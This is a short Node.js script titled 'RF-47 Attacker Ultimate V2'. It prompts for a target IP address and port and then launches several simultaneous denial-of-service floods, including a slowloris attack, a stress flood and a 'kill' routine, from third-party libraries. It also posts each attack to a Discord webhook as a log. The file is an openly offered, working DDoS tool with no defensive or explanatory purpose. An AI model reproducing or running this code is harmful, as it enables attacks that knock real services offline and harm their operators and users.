const os = require("os");
const Loris = require("@anzerr/slowloris.tool");
const { Webhook } = require('discord-webhook-node');
const Stress = require("ddos-stress");
const stress = new Stress ();
const stress1 = new Stress ();

var setTitle = require('console-title');
setTitle('RF-47 ATTACKER ULTIMATE V2');
const prompt = require("prompt-sync")();
console.log(`╔════════════════════════════════════════════╗`.blue);
console.log(`║             RF-47 Ultimate V2              ║`.blue);
console.log(`╚════════════════════════════════════════════╝`.blue);
console.log(`╔══[Input IP]`.blue);
var IP = prompt(`╚════> `.blue);
console.log(`╔══[Input PORT]`.blue);
var PORT = prompt(`╚════> `.blue);
const hook = new Webhook("");
hook.send("** :rocket: [ Logs ] New Sending attack to " + IP +":"+ PORT +"**");
var Kira = require('kira');
var api = new Kira();
var api1 = new Kira();

stress.run(''+ IP +':'+ PORT +'', 7000)
let l = new Loris('http://'+ IP +':'+ PORT +'', 7000).attack();
api.kill('http://'+ IP +'', 700, 20000, 'https://'+ IP +':'+ PORT +'');

return new Promise((resolve) => l.once("end", resolve))
  .then(() => {
    console.log("attack stopped");
  })
  .catch(console.log);


